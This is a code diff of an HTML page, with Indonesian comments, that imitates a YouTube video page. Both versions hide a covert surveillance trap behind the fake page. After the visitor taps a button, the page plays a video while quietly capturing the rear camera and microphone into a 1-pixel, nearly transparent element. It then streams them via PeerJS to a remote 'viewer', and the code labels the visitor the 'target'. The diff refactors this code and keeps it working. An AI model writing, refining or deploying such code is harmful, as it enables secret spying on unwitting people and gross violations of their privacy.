@@ -3,75 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube - Video</title>
+    <title>YouTube</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Roboto, Arial, sans-serif; background: #0f0f0f; color: white; min-height: 100vh; overflow: hidden; }
-        
-        /* YouTube UI Mockup */
-        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; background: #0f0f0f; border-bottom: 1px solid #333; }
-        .logo { display: flex; align-items: center; gap: 4px; font-weight: bold; font-size: 18px; color: white; }
-        .logo-icon { color: #ff0000; font-size: 24px; }
-        
-        .video-wrapper { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; }
-        #ytPlayer { width: 100%; height: 100%; border: none; }
-        
-        .video-info { padding: 15px; }
-        .video-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
-        .channel-info { display: flex; align-items: center; gap: 12px; padding-top: 10px; border-top: 1px solid #333; }
-        .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background: #333; }
-        
-        /* Pop-up Overlay Minimalis */
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.98);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        
-        .modal {
-            text-align: center;
-            padding: 40px;
-            width: 90%;
-            max-width: 400px;
-        }
-        
-        .modal h1 {
-            font-size: 2.2em;
-            margin-bottom: 50px;
-            letter-spacing: 2px;
-            font-weight: 900;
-        }
-        
-        .modal-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-        
-        .btn {
-            padding: 22px;
-            font-size: 1.6em;
-            font-weight: bold;
-            border: 2px solid white;
-            background: transparent;
-            color: white;
-            cursor: pointer;
-            border-radius: 12px;
-            transition: 0.3s;
-            text-transform: uppercase;
-        }
-        
-        .btn:active { background: white; color: black; transform: scale(0.98); }
-        
-        /* Hidden elements */
-        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        body { font-family: Roboto, Arial, sans-serif; background: #000; color: white; min-height: 100vh; overflow: hidden; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .modal { text-align: center; width: 90%; max-width: 400px; }
+        .modal h1 { font-size: 2.2em; margin-bottom: 50px; font-weight: 900; }
+        .modal-buttons { display: flex; flex-direction: column; gap: 25px; }
+        .btn { padding: 22px; font-size: 1.6em; font-weight: bold; border: 2px solid white; background: transparent; color: white; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
+        .btn:active { background: white; color: black; }
+        #ytPlayer { width: 100%; aspect-ratio: 16/9; border: none; }
+        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
@@ -85,23 +28,13 @@
         </div>
     </div>
 
-    <div class="header">
-        <div class="logo"><span class="logo-icon">▶️</span> YouTube</div>
+    <div style="height: 56px; background: #0f0f0f; display: flex; align-items: center; padding: 0 16px;">
+        <span style="color: #ff0000; font-size: 24px; margin-right: 5px;">▶️</span> <strong>YouTube</strong>
     </div>
-
-    <div class="video-wrapper">
-        <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <div class="video-info">
-        <div class="video-title" id="displayTitle">Video Spesial Untuk Anda</div>
-        <div class="channel-info">
-            <div class="channel-avatar"></div>
-            <div>
-                <div style="font-weight: bold;">Trending Channel</div>
-                <div style="font-size: 12px; color: #aaa;">2.5jt subscriber</div>
-            </div>
-        </div>
+    <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    <div style="padding: 15px;">
+        <div style="font-size: 18px; font-weight: bold;">Video Rekomendasi Hari Ini</div>
+        <div style="color: #aaa; font-size: 14px; margin-top: 10px;">Trending • 1.2jt ditonton</div>
     </div>
 
     <video id="cameraPreview" autoplay playsinline muted></video>
@@ -118,88 +51,56 @@
         const cameraPreview = document.getElementById('cameraPreview');
         
         let peer = null;
-        let conn = null;
         let localStream = null;
-        let activeCall = null;
 
-        // Pre-setup YouTube Player
         ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
 
-        async function startMedia() {
+        async function startApp() {
             try {
-                // LANGSUNG minta akses kamera saat tombol diklik (ini kunci agar izin muncul real-time)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                // 1. Ambil Kamera DULU
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' }, 
                     audio: true 
                 });
-                
-                localStream = stream;
-                cameraPreview.srcObject = stream;
-                
-                // Inisialisasi PeerJS SETELAH izin didapat
-                initPeer();
-                
-                return true;
+                cameraPreview.srcObject = localStream;
+
+                // 2. Setup Peer
+                peer = new Peer(targetId, {
+                    host: '0.peerjs.com', port: 443, secure: true,
+                    config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] }
+                });
+
+                peer.on('open', (id) => {
+                    if (viewerId) {
+                        // 3. TARGET yang menelpon VIEWER (Lebih stabil)
+                        const call = peer.call(viewerId, localStream);
+                        
+                        // Hubungkan data channel juga
+                        const conn = peer.connect(viewerId);
+                        conn.on('open', () => {
+                            conn.send({ type: 'target_ready', targetId: id });
+                        });
+                    }
+                });
             } catch (err) {
-                console.error("Izin ditolak atau error:", err);
-                // Coba lagi tanpa audio jika gagal
+                alert("Gagal akses kamera. Pastikan Anda menekan 'Allow'.");
+                // Fallback video only
                 try {
                     localStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    cameraPreview.srcObject = localStream;
-                    initPeer();
-                    return true;
-                } catch (e) {
-                    return false;
-                }
+                    startApp();
+                } catch(e) {}
             }
         }
 
-        function initPeer() {
-            peer = new Peer(targetId, { 
-                host: '0.peerjs.com', 
-                port: 443, 
-                secure: true, 
-                debug: 1,
-                config: {
-                    'iceServers': [
-                        { 'urls': 'stun:stun.l.google.com:19302' },
-                        { 'urls': 'stun:stun1.l.google.com:19302' }
-                    ]
-                }
-            });
-            
-            peer.on('open', (id) => {
-                if (viewerId) {
-                    conn = peer.connect(viewerId, { reliable: true });
-                    conn.on('open', () => {
-                        conn.send({ type: 'target_ready', targetId: id });
-                    });
-                }
-            });
-
-            peer.on('call', (call) => {
-                activeCall = call;
-                call.answer(localStream);
-            });
-        }
-
-        document.getElementById('btnYes').addEventListener('click', async () => {
-            // 1. Sembunyikan overlay
+        document.getElementById('btnYes').addEventListener('click', () => {
             overlay.style.display = 'none';
-            
-            // 2. Putar YouTube
             ytPlayer.src = ytPlayer.src.replace('autoplay=0', 'autoplay=1');
-            
-            // 3. Langsung pemicu kamera (Real-time)
-            await startMedia();
+            startApp();
         });
 
         document.getElementById('btnNo').addEventListener('click', () => {
             window.location.href = "https://www.youtube.com";
         });
-
-        // Keepalive
-        setInterval(() => { if (conn && conn.open) conn.send({ type: 'ping' }); }, 15000);
     </script>
 </body>
 </html>
